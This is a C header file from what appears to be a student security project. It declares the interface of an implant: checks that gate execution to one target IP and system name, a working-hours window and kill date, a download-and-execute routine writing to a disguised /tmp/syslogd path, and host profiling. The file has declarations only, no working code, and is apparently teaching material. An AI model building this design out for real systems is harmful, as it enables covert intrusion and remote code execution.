/*  File: valHelper.h
*   Author: STUDENT
*   Date: 
*   Description: 
*               
*               
*/

#include <netdb.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <time.h>
#include "../buildAndConfig/functionality.h"

/* ======== Validating ======= */

// exits if VALID_IP macro is not the hosts's actual ip address. Does nothing otherwise
void val_IP();

//  exits if VALID_SYSNAME macro is not the hosts's actual ip address. Does nothing otherwise
void val_SysName();

// Called after making sure it is a target machine with above functions. Sleeps until WORK_START_T < localtime < WORK_END_T
// Exits in failure if current date is after the END_DATE
void val_time();

// downloads a file at the specified url to /tmp/syslogd/<file>. Returns 0 if succesful, 1 otherwise.
int dwnldAndExecFile(char* url);


/*======== Profiling =======  TODO */

// Struct used to create a detailed profile of the host machine
struct Profile{
// TODO
};

// returns a Profile with NAN/-1 for invalid responses
struct Profile* getProfile();

// returns a string with a bunch of profile info. User must free() the returned str when done.
char* strProfile(struct Profile* toPrint);


/* ======== General ======= */

// For debugging. Calls execCommand(), prints it, and frees the memory
void printCmdResults(char* command);
